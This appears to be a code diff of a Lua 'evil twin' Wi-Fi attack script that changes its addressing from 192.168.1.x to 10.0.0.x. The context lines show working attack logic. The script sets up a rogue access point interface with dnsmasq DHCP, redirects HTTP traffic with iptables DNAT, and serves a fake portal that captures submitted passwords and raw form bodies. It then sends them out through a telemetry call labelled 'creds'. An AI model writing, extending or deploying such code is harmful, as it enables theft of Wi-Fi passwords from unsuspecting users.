@@ -25,12 +25,12 @@ local function airbase()
 end
 
 local function dhcp()
-  local cfg="interface=at0\ndhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\n"
+  local cfg="interface=at0\ndhcp-range=10.0.0.2,10.0.0.100,255.255.255.0,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\n"
   local f=io.open("/tmp/edhcp.conf","w")
   if f then f:write(cfg); f:close()
-    os.execute("ifconfig at0 192.168.1.1 netmask 255.255.255.0 up 2>/dev/null")
+    os.execute("ifconfig at0 10.0.0.1 netmask 255.255.255.0 up 2>/dev/null")
     os.execute("dnsmasq -C /tmp/edhcp.conf -d 2>/dev/null &")
-    tel("dhcp_ok",'{"gw":"192.168.1.1"}')
+    tel("dhcp_ok",'{"gw":"10.0.0.1"}')
   else tel("dhcp_fail",'{}') end
 end
 
@@ -38,7 +38,7 @@ local function httpd()
   tel("httpd_start",'{}')
   local ok, sock = pcall(require,"socket")
   if not ok then
-    os.execute("iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:8080 2>/dev/null")
+    os.execute("iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:8080 2>/dev/null")
     return nil,nil
   end
   local s,e=sock.tcp() if not s then return nil,nil end
@@ -57,7 +57,7 @@ local function httpd()
       local pw=body and body:match("password=([^&]+)") or ""
       if pw then pw=pw:gsub("%%(%x%x)",function(h) return string.char(tonumber(h,16)) end) end
       tel("creds",'{"password":'..je(pw)..',"raw":'..je(body or "")..'}')
-      c:send("HTTP/1.1 302 Found\r\nLocation: http://192.168.1.1/\r\nContent-Length:0\r\nConnection:close\r\n\r\n")
+      c:send("HTTP/1.1 302 Found\r\nLocation: http://10.0.0.1/\r\nContent-Length:0\r\nConnection:close\r\n\r\n")
     else
       c:send(portal)
     end
